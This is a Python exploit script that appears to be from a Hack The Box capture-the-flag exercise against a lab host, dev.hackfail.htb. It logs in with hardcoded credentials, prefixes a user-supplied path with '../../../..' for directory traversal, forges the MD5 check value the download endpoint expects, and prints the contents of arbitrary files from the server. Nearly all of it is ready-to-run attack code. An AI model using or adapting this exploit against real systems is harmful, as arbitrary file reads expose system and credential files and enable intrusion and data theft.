#!/usr/bin/python3
import requests, hashlib, sys

if len(sys.argv) < 2:
    print(f"Usage: python3 {sys.argv[0]} <file>")
    sys.exit(1)

session = requests.Session()

target = "http://dev.hackfail.htb/login"
data = {"username": "ElonMusk", "password": "testing"}
session.post(target, data=data)

default_path = "/var/www/blog_dev/uploads/"
file_path = f"../../../..{sys.argv[1]}"
full_path = default_path + file_path
hash = hashlib.md5(full_path.encode()).hexdigest()

target = "http://dev.hackfail.htb/download"
params = {"file": file_path, "c": hash}
request = session.get(target, params=params)

result = request.text.find("<!DOCTYPE html>")
print(request.text[:result].strip())
